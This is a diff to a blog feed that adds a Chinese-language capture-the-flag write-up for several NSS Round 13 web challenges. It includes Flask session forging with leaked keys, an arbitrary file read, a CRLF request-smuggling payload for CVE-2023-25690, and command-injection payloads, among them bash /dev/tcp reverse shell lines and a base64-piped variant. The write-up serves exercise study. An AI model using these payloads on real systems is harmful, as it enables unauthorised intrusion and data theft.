@@ -3,7 +3,58 @@
     <id>https://hq185187.github.io</id>
     <title>welcome to my blog</title>
     <link href="https://hq185187.github.io" />
-    <updated>2023-06-21T13:44:24.210Z</updated>
+    <updated>2023-06-23T12:40:27.963Z</updated>
+    <entry>
+        <id>https://hq185187.github.io/2023/06/23/NSS%20Round13/</id>
+        <title>NSS Round 13</title>
+        <link rel="alternate" href="https://hq185187.github.io/2023/06/23/NSS%20Round13/"/>
+        <content type="html">&lt;h2 id=&#34;1flaskjwt&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1flaskjwt&#34;&gt;#&lt;/a&gt; 1.flask?jwt?&lt;/h2&gt;
+&lt;p&gt;根据题目提示可以猜出这是 flask session 伪造问题&lt;br&gt;
+在忘记密码的页面源代码发现 key&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!-- secretkey: th3f1askisfunny --&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;经过简单的 fuzz 可以知道:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;admin 已经被注册&lt;/li&gt;
+&lt;li&gt;只有 admin 可以拿 flag&lt;br&gt;
+ 抓普通用户点击拿 flag 的时候的包，开始伪造 session:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python flask_session_cookie_manager3.py decode -c &amp;#x27;你的session&amp;#x27; -s &amp;#x27;th3f1askisfunny&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;可以看此时的_user_id是2,admin应该是1,改成1加密&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python flask_session_cookie_manager3.py encode -t &amp;quot;&amp;#123;&amp;#x27;_fresh&amp;#x27;: True, &amp;#x27;_id&amp;#x27;: &amp;#x27;d58a3e83c73f903728231612f76290dfc46bf8b4ffa32c0c824e0cb6a54c459891ea2fc13e9cfbef830b8becebbd152e9b0f5039ff3a09f94be96dac53dec926&amp;#x27;, &amp;#x27;_user_id&amp;#x27;: &amp;#x27;1&amp;#x27;&amp;#125;&amp;quot; -s &amp;#x27;th3f1askisfunny&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;将得到的新 session 改变一下得 flag&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2023/06/23/wOxmQsfUvelYBhz.png&#34; alt=&#34;屏幕截图 2023-06-23 153546.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2flaskjwthard&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2flaskjwthard&#34;&gt;#&lt;/a&gt; 2.flask?jwt?(hard)&lt;/h2&gt;
+&lt;p&gt;这题把 key 藏起来了，注册登录后看原代码提示 /wor 路由，访问给了登录时间，&lt;mark&gt; 回到登录这里把 session 随便删除一点就能看到 debug 模式回显 302, 对回显的 session 进行 base64 解码发现是进入的提示语句&lt;/mark&gt;，于是在 /wor 路由把 session 也随便删点，可以看到 key&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;app.secret_key = &amp;#x27;hardgam3_C0u1d_u_f1ndM3????&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;之后的做法和第一题一样伪造 session 就行了&lt;/p&gt;
+&lt;h2 id=&#34;3信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3信息收集&#34;&gt;#&lt;/a&gt; 3. 信息收集&lt;/h2&gt;
+&lt;p&gt;收集到 index.php&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;   &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;]))&amp;#123;       &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt; file_get_contents&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;file&amp;#x27;&lt;/span&gt;]);   &amp;#125;   &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;    &lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);   &amp;#125;   &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;dirsearch 扫到 index.php, 此时是一个任意文件读取点，通过题目提示信息收集和回显的 &lt;code&gt;Server: Apache/2.4.55 (Unix)&lt;/code&gt; &lt;br&gt;
+ 找到了&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTIzNDU=&#34;&gt; CVE-2023-25690&lt;/span&gt;&lt;br&gt;
+ 读取 &lt;code&gt;/usr/local/apache2/conf/httpd.conf&lt;/code&gt; ，得到：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;RewriteEngine on RewriteRule &amp;quot;^/nssctf/(.*)&amp;quot; &amp;quot;http://backend-server:8080/index.php?id=$1&amp;quot; [P] ProxyPassReverse &amp;quot;/nssctf/&amp;quot; &amp;quot;http://backend-server:8080/&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;再修改姿势：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/nssctf/abc%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20/flag.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;4ez_factors&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4ez_factors&#34;&gt;#&lt;/a&gt; 4.ez_factors&lt;/h2&gt;
+&lt;p&gt;点击 Tool 直接跳转 factors/114514&lt;br&gt;
+ 此时页面也有 114514，试试命令执行&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/factors/114514|echo 666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;输出了666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;直接反弹shell,这里&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/factors/114514|bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;和&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/factors/114514|bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;都会失败&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;用 base64 加密执行：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/factors/114514|echo [这里是反弹shellbase64加密后的内容]|base64 -d|bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;直接 cat /flag&lt;/p&gt;
+&lt;h2 id=&#34;5myweb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5myweb&#34;&gt;#&lt;/a&gt; 5.MyWeb&lt;/h2&gt;
+&lt;p&gt;源码：&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2023/06/23/n61TJxSUbLIyFRq.png&#34; alt=&#34;屏幕截图 2023-06-23 192202.png&#34;&gt;&lt;br&gt;
+ 题目将 &lt;code&gt;]&lt;/code&gt;  替换成 &lt;code&gt;, $value]&lt;/code&gt; &lt;br&gt;
+ 猜测 json 文件的结构是：&lt;br&gt;
+ &lt;code&gt;[1,2,3,4,...]&lt;/code&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;假设它的结构是[1,2,3]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;比如我们输入一个];666&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;结构变成：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1,2,3, ];666]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;构造payload闭合[]:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;];%0aecho `cat /flag`;%0a[&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;payload:&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?mode=save&amp;amp;&amp;amp;value=];%0aecho `cat /flag`;%0a[&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?mode=read&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;h2 id=&#34;6timetrcer&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6timetrcer&#34;&gt;#&lt;/a&gt; 6.TimeTrcer&lt;/h2&gt;
+&lt;p&gt;有点难，后面看&lt;/p&gt;
+</content>
+        <updated>2023-06-23T12:40:27.963Z</updated>
+    </entry>
     <entry>
         <id>https://hq185187.github.io/2023/06/21/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</id>
         <title>反弹shell学习</title>
